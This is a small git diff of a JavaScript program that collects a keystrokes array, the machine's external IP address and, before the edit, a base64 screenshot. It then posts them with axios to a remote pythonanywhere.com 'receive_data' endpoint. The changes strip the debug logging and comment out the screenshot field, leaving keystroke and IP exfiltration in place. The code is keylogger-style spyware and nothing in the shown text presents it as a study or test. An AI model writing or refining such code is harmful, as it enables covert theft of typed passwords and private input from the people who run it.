@@ -16,7 +16,6 @@ function getIPAddress() {
   for (const name of Object.keys(interfaces)) {
     for (const net of interfaces[name]) {
       if (net.family === 'IPv4' && !net.internal) {
-        console.log("Detected IP:", net.address)
         return net.address
       }
     }
@@ -46,11 +45,9 @@ async function sendData() {
       data: [
         keystrokes,       // Data 1: Keystrokes array
         getIPAddress(),   // Data 2: IP address
-        screenshot        // Data 3: Screenshot as base64 string
+        // screenshot        // Data 3: Screenshot as base64 string
       ]
     }
-
-    console.log("Payload:", payload)
 
     const response = await axios.post(
       'http://swadheenmishra123.pythonanywhere.com/receive_data', 
